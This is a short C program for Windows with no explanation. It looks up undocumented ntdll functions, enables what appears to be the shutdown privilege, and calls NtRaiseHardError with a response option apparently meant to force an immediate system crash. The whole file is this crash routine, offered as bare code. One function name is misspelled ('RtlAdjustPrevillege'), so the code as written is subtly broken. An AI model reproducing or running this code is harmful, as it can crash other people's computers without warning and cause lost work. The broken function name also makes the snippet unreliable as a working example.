#include <Windows.h>
int main() {
    HMODULE ntdll = LoadLibrary("ntdll.dll");
    FARPROC RtlAdjPrev = GetProcAddress(ntdll, "RtlAdjustPrevillege");
    FARPROC NtRaiseHardErr = GetProcAddress(ntdll, "NtRaiseHardError");
    unsigned char ErrKill;
    long unsigned int HDErr;
    ((void (*) (DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPrev) (0x13, true, false, &ErrKill);
    ((void (*) (DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xc0114514, 0, 0, 0, 6, &HDErr);
    return 0;
}